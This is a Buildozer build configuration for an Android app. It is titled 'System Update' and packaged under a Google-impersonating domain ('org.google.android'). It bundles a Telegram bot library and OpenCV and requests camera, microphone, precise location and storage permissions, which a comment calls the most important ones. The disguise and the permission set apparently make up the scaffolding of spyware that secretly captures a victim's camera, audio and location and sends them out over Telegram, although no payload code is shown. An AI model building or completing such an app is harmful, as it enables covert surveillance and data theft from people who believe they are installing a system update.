[app]
title = System Update
package.name = sysupdate.service
package.domain = org.google.android
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0
requirements = python3,kivy==2.2.1,pyTelegramBotAPI,opencv-python,jnius
orientation = portrait
fullscreen = 0
# Sab se zaroori permissions
android.permissions = INTERNET, CAMERA, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, ACCESS_FINE_LOCATION, RECORD_AUDIO
android.api = 33
android.minapi = 21
android.ndk = 25b
android.accept_sdk_license = True
android.archs = arm64-v8a

[buildozer]
log_level = 2
warn_on_root = 1
